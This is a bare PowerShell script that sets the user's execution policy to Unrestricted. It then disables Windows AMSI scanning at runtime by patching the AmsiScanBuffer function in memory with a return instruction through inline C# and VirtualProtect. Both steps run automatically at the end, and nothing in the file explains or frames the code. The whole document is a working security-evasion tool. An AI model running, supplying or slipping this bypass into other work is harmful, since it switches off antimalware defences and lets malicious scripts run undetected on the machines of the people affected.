
function Set-ExecutionPolicyUnrestricted {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force
        Write-Output "Execution policy set to Unrestricted."
    } catch {
        Write-Error "Failed to set execution policy: $_"
    }
}


function Disable-AMSI {
    try {
        $Script:AMSIBypass = @"
using System;
using System.Runtime.InteropServices;
public class AMSI {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Bypass() {
        IntPtr hModule = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(hModule, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out oldProtect);
        Marshal.WriteByte(addr, 0xC3);
        VirtualProtect(addr, (UIntPtr)5, oldProtect, out oldProtect);
    }
}
"@
        Add-Type -TypeDefinition $AMSIBypass
        [AMSI]::Bypass()
        Write-Output "AMSI protection disabled."
    } catch {
        Write-Error "Failed to disable AMSI protection: $_"
    }
}




Set-ExecutionPolicyUnrestricted
Disable-AMSI

